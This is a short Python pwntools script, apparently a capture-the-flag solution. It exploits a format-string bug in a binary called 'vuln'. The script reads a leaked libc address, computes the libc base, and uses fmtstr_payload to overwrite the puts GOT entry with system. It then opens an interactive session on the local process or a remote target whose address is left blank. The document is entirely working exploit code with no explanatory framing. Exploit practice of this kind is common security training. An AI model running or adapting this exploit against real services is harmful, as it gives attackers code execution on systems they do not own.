#!/usr/bin/env python3
from pwn import *
from struct import pack

context.binary = binary = ELF("./vuln")
libc = ELF("./libc.so.6")

addr = ''
port = ''

def conn():
    if args.LOCAL:
        r = process([binary.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(addr, port)
    return r

def exec_func(payload):
    with process("./vuln") as p:
        p.sendline(payload)
        p.recvline()
        p.recvline()
        res = p.recvline()
        print(res)
        return res.strip()

def attack(r, **kwargs):
    fmtstr = FmtStr(exec_func)
    r.recvuntil("libc: ")
    setvbuf = int(
            r.recvline().strip().decode(), 16
            )
    libc.address = setvbuf - 0x7a3f0
    payload = b"A" *fmtstr.padlen + fmtstr_payload(
            fmtstr.offset, {binary.got.puts: libc.symbols.system}
            )
    print("payload=", payload)
    r.sendline(payload)


def main():
    r = conn()
    attack(r)
    r.interactive()


if __name__ == "__main__":
    main()
